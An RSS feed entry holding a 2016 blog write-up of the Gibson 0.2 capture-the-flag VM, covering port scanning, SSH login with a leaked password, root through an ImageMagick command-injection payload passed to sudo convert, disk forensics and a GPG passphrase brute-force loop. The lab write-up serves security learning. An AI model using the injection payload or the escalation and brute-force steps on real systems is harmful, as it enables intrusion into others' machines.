@@ -1,0 +1,261 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Gibson on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/gibson/</link>
+    <description>Recent content in Gibson on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 21 May 2016 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/gibson/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Gibson 0.2</title>
+      <link>http://rastamouse.me/writeups/2016/gibson/</link>
+      <pubDate>Sat, 21 May 2016 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2016/gibson/</guid>
+      <description>
+
+&lt;h1 id=&#34;livestream:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Livestream&lt;/h1&gt;
+
+&lt;p&gt;&lt;iframe src=&#34;https://player.twitch.tv/?video=v67731859&#34; frameborder=&#34;0&#34; scrolling=&#34;no&#34; height=&#34;448&#34; width=&#34;735&#34;&gt;&lt;/iframe&gt;&lt;a href=&#34;https://www.twitch.tv/rastamaus?tt_medium=live_embed&amp;tt_content=text_link&#34; target=&#34;_blank&#34; style=&#34;padding:2px 0px 4px; display:block; width:345px; font-weight:normal; font-size:10px;text-decoration:underline;&#34;&gt;Watch live video from RastaMaus on www.twitch.tv&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;writeup:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Writeup&lt;/h1&gt;
+
+&lt;h2 id=&#34;nmap:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -n -p- -sV 192.168.56.102
+
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;davinci:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;davinci&lt;/h2&gt;
+
+&lt;p&gt;Opening the page in Iceweasel, we get a simple directory lising with &lt;code&gt;davinci.html&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;title&amp;gt;Gibson Mining Corporation&amp;lt;/title&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;!-- Damn it Margo! Stop setting your password to &amp;quot;god&amp;quot; --&amp;gt;
+&amp;lt;!-- at least try and use a different one of the 4 most --&amp;gt;
+&amp;lt;!-- common ones! (eugene) --&amp;gt;
+&amp;lt;h1&amp;gt; The answer you seek will be found by brute force&amp;lt;/h1&amp;gt;
+&amp;lt;/body&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;ssh:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;We can use &lt;code&gt;margo:god&lt;/code&gt; to establish an SSH session :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# ssh margo@192.168.56.102
+
+margo@192.168.56.102&#39;s password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)
+
+margo@gibson:~$ id
+uid=1002(margo) gid=1002(margo) groups=1002(margo),27(sudo)
+
+margo@gibson:~$ sudo -l
+Matching Defaults entries for margo on gibson:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User margo may run the following commands on gibson:
+    (ALL) NOPASSWD: /usr/bin/convert
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;image-tragick:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Image Tragick&lt;/h2&gt;
+
+&lt;p&gt;We&amp;rsquo;ll check the version first to make sure it is vulnerable.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;margo@gibson:~$ convert --version
+Version: ImageMagick 6.7.7-10
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then we can exploit the vulnerability and execute &lt;code&gt;/bin/sh&lt;/code&gt; to get a root shell ^_^&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;margo@gibson:~$ sudo convert &#39;https://example.com&amp;quot;;/bin/sh&amp;quot;&#39; out.png
+# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;where-art-thou-flag:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Where art thou, flag?&lt;/h2&gt;
+
+&lt;p&gt;There&amp;rsquo;s no flag in &lt;code&gt;/root&lt;/code&gt;, so it looks like we&amp;rsquo;ll have to look at little deeper.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# ps aux
+
+libvirt+  1303  0.5  7.3 841876 111516 ?       Sl   22:33   0:21 /usr/bin/qemu-system-x86_64 -name ftpserv -S -machine pc-i440fx-trusty,accel=tcg,usb=off -m 2
+
+# ifconfig
+virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb  
+          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:6 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:15 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:1271 (1.2 KB)  TX bytes:1889 (1.8 KB)
+
+# netstat -antp
+
+tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1290/dnsmasq    
+tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      1303/qemu-system-x8
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Something is running virtualised on &lt;code&gt;192.168.122.1&lt;/code&gt; and is binding a &lt;code&gt;VNC&lt;/code&gt; service onto the localhost.  We could setup an SSH forwarder back to our machine and use a VNC client to interact with the image.  But I figured I would just find the image, move it to my kali VM and interact with it forensically.&lt;/p&gt;
+
+&lt;p&gt;We can see from the process list that the name of the image is &lt;code&gt;ftpserv&lt;/code&gt;, so we can just search based on that.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# find / -name ftpserv*
+
+/var/lib/libvirt/images/ftpserv.img
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I copied it to the web root for easy downloading&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# cp /var/lib/libvirt/images/ftpserv.img /var/www/html
+# chmod 666 /var/www/html/ftpserv.img
+
+root@kali:~# wget http://192.168.56.102/ftpserv.img
+
+root@kali:~# file ftpserv.img 
+ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;sleuthing:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Sleuthing&lt;/h2&gt;
+
+&lt;p&gt;First, display the partition layout of the volume with &lt;code&gt;mmls&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# mmls ftpserv.img 
+DOS Partition Table
+Offset Sector: 0
+Units are in 512-byte sectors
+
+      Slot      Start        End          Length       Description
+000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
+001:  -------   0000000000   0000000062   0000000063   Unallocated
+002:  000:000   0000000063   0001048319   0001048257   Win95 FAT16 (0x0e)
+003:  -------   0001048320   0001048575   0000000256   Unallocated
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Take note of the &lt;code&gt;start offset&lt;/code&gt; for the &lt;code&gt;FAT16&lt;/code&gt; partition, which is &lt;code&gt;63&lt;/code&gt;.  Then list file and directory names in the disk image using &lt;code&gt;fls&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# fls -f fat16 -o 63 ftpserv.img 
+r/r 3:	KFYLNN      (Volume Label Entry)
+d/d 4:	DOS
+r/r 5:	KERNEL.SYS
+r/r 6:	AUTOEXEC.BAT
+r/r 7:	COMMAND.COM
+r/r 8:	FDCONFIG.SYS
+r/r 9:	BOOTSECT.BIN
+d/d 11:	net
+d/d 12:	GARBAGE
+r/r * 13:	_WSDPMI.SWP
+v/v 16763907:	$MBR
+v/v 16763908:	$FAT1
+v/v 16763909:	$FAT2
+d/d 16763910:	$OrphanFiles
+
+root@kali:~# fls -f fat16 -o 63 ftpserv.img 12
+r/r 845574:	jz_ug.ans
+r/r * 845576:	cookies.txt^
+r/r 845578:	adminspo.jpg
+r/r 845580:	flag.img
+r/r * 845582:	cookies.txt^
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like &lt;code&gt;flag.img&lt;/code&gt; is what we need - we can use &lt;code&gt;icat&lt;/code&gt; to extract it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# icat -f fat16 -o 63 ftpserv.img 845580 &amp;gt; flag.img
+
+root@kali:~# file flag.img 
+flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You could continue using forensics here, but I was determined to &lt;code&gt;mount&lt;/code&gt; something today! :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# mount -t ext2 flag.img /mnt/
+
+root@kali:~# ls -la /mnt/
+
+-rwxrwxr-x  1 root root 21358 Nov 16  2011 davinci
+-rw-r--r--  1 root root 28030 Nov 16  2011 davinci.c
+-rw-r--r--  1 root root   159 May  5 19:56 hint.txt
+drwxr-xr-x  2 root root  1024 May  5 20:07 .trash
+
+root@kali:~# ls -la /mnt/.trash/
+
+---x------ 1 root root    469 May 14 14:18 flag.txt.gpg
+-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
+
+root@kali:~# cat /mnt/hint.txt
+
+http://www.imdb.com/title/tt0117951/ and
+http://www.imdb.com/title/tt0113243/ have
+someone in common... Can you remember his
+original nom de plume in 1988...?
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we have a GPG-protected flag and a hint as to what the password could be.  I started looking at &lt;code&gt;Jonny Lee Miller&lt;/code&gt; and some associated nicknames/aliases etc.  Eventually I came up with &lt;code&gt;Sick Boy&lt;/code&gt; and &lt;code&gt;Zero Cool&lt;/code&gt;.  Neither of these worked vanilla, so I thought I&amp;rsquo;d use &lt;code&gt;john&lt;/code&gt; to create a wordlist.  I didn&amp;rsquo;t know off-hand of any tools that could bruteforce GPG, so I wrote a terrible bash wrapper for it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;for p in `cat words`
+do
+	gpg --output /root/flag --batch --passphrase &amp;quot;${p}&amp;quot; --decrypt /mnt/.trash/flag.txt.gpg
+
+	if [ -a /root/flag ]
+	then
+		echo &#39;found&#39;
+		exit
+	fi
+done
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;None of the wordlists I was created worked, so &lt;code&gt;knigh-home&lt;/code&gt; dropped me a hint that it was in &lt;code&gt;leet speak&lt;/code&gt; and told me of a &lt;code&gt;leetify&lt;/code&gt; script that I should look for.  Googling for it brought me to an old &lt;a href=&#34;http://www.backtrack-linux.org/forums/showthread.php?t=19933&#34;&gt;post on the BackTrack forum&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;So I generated a new wordlist and ran my bruteforce again.  These still weren&amp;rsquo;t working and I was given a final hint to try &lt;code&gt;zerokool&lt;/code&gt; instead of &lt;code&gt;zerocool&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@kali:~# ./leetify.pl &amp;lt; words &amp;gt; l33t
+
+root@kali:~# ./gpg.sh 
+[...snip...]
+gpg: decryption failed: bad key
+gpg: CAST5 encrypted data
+gpg: encrypted with 1 passphrase
+gpg: WARNING: message was not integrity protected
+found
+
+root@kali:~# ls -l
+
+-rw-r--r-- 1 root root       862 May 22 10:34 flag
+
+root@kali:~# cat flag
+ _   _            _      _____ _             ____  _                  _   _
+| | | | __ _  ___| | __ |_   _| |__   ___   |  _ \| | __ _ _ __   ___| |_| |
+| |_| |/ _` |/ __| |/ /   | | | &#39;_ \ / _ \  | |_) | |/ _` | &#39;_ \ / _ \ __| |
+|  _  | (_| | (__|   &amp;lt;    | | | | | |  __/  |  __/| | (_| | | | |  __/ |_|_|
+|_| |_|\__,_|\___|_|\_\   |_| |_| |_|\___|  |_|   |_|\__,_|_| |_|\___|\__(_)
+
+
+Should you not be standing in a 360 degree rotating payphone when reading
+this flag...? B-)
+
+Anyhow, congratulations once more on rooting this VM. This time things were
+a bit esoteric, but I hope you enjoyed it all the same.
+
+Shout-outs again to #vulnhub for hosting a great learning tool. A special
+thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
+to host the CTF once more.
+                                                              --Knightmare
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;shout-outs:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Shout outs&lt;/h2&gt;
+
+&lt;p&gt;Thanks &lt;code&gt;knightmare&lt;/code&gt; for the VM and the continued hints throughout the livestream :)&lt;/p&gt;
+
+&lt;p&gt;Thanks to everyone who stopped by for the livestream and particularly to those who posted in Twitch chat and the IRC channel.  Honourable mentions go to &lt;code&gt;rfc&lt;/code&gt;, &lt;code&gt;dqi&lt;/code&gt; and &lt;code&gt;superkojiman&lt;/code&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
